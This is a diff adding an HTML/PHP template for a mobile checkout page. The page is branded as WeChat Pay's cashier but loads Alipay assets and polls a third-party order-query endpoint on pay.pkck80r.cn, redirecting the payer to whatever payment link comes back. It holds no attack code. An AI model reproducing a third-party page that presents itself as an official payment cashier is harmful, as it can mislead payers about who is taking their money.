@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible" />
+    <meta content="webkit" name="renderer" />
+    <title>微信支付</title>
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta content="telephone=no,email=no" name="format-detection" />
+    <meta id="WV.Meta.Share.Disabled" value="true" />
+    <meta content="pay" name="data-bizType" />
+    <meta content="a283" name="data-aspm" />
+
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" name="viewport" />
+
+    <link href="https://as.alipayobjects.com:443/g/snake/h5cashier/1.0.5/h5cashier.css" media="all" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="/Public/zfb/qiswl/jquery.min.js"></script>
+    <script type="text/javascript" src="/Public/zfb/qiswl/layer/layer.js"></script>
+
+    <script>
+        /*<![CDATA[*/
+        ///5000的
+        var service = '<{$qrurl}>';
+ 
+        var queryUrl = 'http://pay.pkck80r.cn:8081/T/alipaye7595a0260c9b0c21e8498f32e286f4b';
+        var enableWait = 'true';
+        var waitTime = '2';
+        /*]]>*/
+    </script>
+</head>
+<body>
+<div class="J-msg-mask am-msg-mask" style="display:none"></div>
+<div class="J-msg-box am-msg-box" style="display:none">
+    <div class="am-msg-box-content">
+        <p class="J-msg-text"></p>
+        <button class="J-msg-cancel am-button am-button-blue" type="button">知道了</button>
+    </div>
+</div>
+
+<header class="am-header">
+    <h1>
+        <span class="title-main" data-title="微信收银台">微信收银台</span>    </h1>
+
+</header>
+
+
+<noscript><h1 style="color:red">您的浏览器不支持JavaScript，请更换浏览器或开启JavaScript设置!</h1></noscript>
+<!-- FD:256:mobileclientgw/home/v5/h5PayRoute.vm:START --><style>
+    body {
+        font-weight: 500;
+        font-family: PingFangSC-Regular, "Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+    }
+    .am-header {
+        display: none;
+    }
+    .alipay-logo {
+        display: none;
+    }
+    .result {
+        position: absolute;
+        top: 50%;
+        margin-top: -215px;
+        width: 100%;
+    }
+
+    .result-logo {
+        width: 70px;
+        height: 98px;
+        margin: auto;
+        background-image:url('data:image/png;base64,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');
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+    .result-title {
+        margin: 40px 0 14px;
+        text-align: center;
+        font-size: 21px;
+        color: #00a0e8;
+        line-height: 25px;
+    }
+    .result-tips {
+        max-width: 370px;
+        margin: 0 auto 10px;
+        padding: 0 15px;
+        font-size: 15px;
+        color: #a5a5a5;
+        line-height:18px;
+        text-align:left;
+        word-break:break-all;
+        word-wrap:break-word;
+    }
+    .result-botton {
+        margin: 0 15px 20px;
+    }
+    .result-botton a {
+        display: block;
+        margin: auto;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        max-width: 384px;
+        height:44px;
+        text-align: center;
+    }
+    .result-botton a.am-button-white {
+        color: #00aaee;
+        background:#ffffff;
+        border:1px solid #00aaee;
+    }
+    .result-botton .am-button[disabled=disabled] {
+        color: #e6e6e6;
+        background: #f8f8f8;
+        border: 1px solid #dedede;
+    }
+    .loading {
+        display: none;
+    }
+</style>
+
+<div class="loading"></div>
+<div class="am-content">
+    <input name="params" type="hidden" value="{&quot;server_param&quot;:&quot;emlkPTk5O25kcHQ9OTQ4NDtjYz15&quot;}" />
+    <div class="result">
+        <div class="result-logo"></div>
+        <div class="result-title">正在尝试打开微信客户端</div>
+        <div class="result-tips">请耐心等待,稍后会自动唤起支付;</div>
+        <div class="result-botton"><button class="J-h5pay am-button am-button-blue" href="javascript:void(0)" style="background: #42af35;border: 1px solid #42af35;" id="paybtn" disabled>等待中……</button></div>
+    </div>
+</div>
+<script type="text/javascript" src="/Public/zfb/qiswl/jquery.min.js"></script>
+<script>
+    //订单监控  {订单监控}
+    var updateQrImg=0;
+    function order() {
+        $.post('<{:U("Pay/Zhuanzhuan/automaticAlipayQuery")}>',{id:'<{$orderid}>'},
+            function(result) {
+                //成功
+                if (result.code == '200') {
+                    
+                    //回调页面
+                    window.clearInterval(orderlst);
+                    layer.confirm(result.msg, {
+                        icon: 1,
+                        title: '支付成功',
+                        btn: ['我知道了'] //按钮
+                    }, function() {
+                        location.href = "<?php echo $success_url;?>";
+                    });
+                    setTimeout(function() {
+                        location.href = "<?php echo $success_url;?>";
+                    }, 5000);
+                }
+                //支付二维码
+                if (result.code == '100' && updateQrImg == 0) {
+
+                    $('#qrcode_load').remove();
+                    $('.result-title').html('点击下方立即支付按钮付款');
+                    $('#paybtn').text('立即支付');
+                    $('#paybtn').attr('onclick', 'pay("' + result.data.h5 + '")');
+                    $('#paybtn').attr('disabled', false);
+                    
+                    window.location.href=result.data.h5;
+                    updateQrImg = 1;
+
+                    var okpay = document.getElementById('okpay');
+
+                }
+                //订单已经超时
+                if (result.code == '-11') {
+
+                    $('#qrcode_load').remove();
+                    $('.result-title').html('下单失败，请返回重新下单');
+                    $('#paybtn').text('下单失败');
+                }
+                //订单已经超时
+                if (result.code == '-1' || result.code == '-2') {
+
+                    window.clearInterval(orderlst);
+                    layer.confirm(result.msg, {
+                        icon: 2,
+                        title: '支付失败',
+                        btn: ['确认'] //按钮
+                    }, function() {
+                        history.back(-1);
+                    });
+                }
+            });
+    }
+
+    function pay(url){
+        window.location.href=url;
+    }
+
+    //周期监听
+    var orderlst = setInterval("order()", 1000);
+</script>
+    
+</body>
+</html>
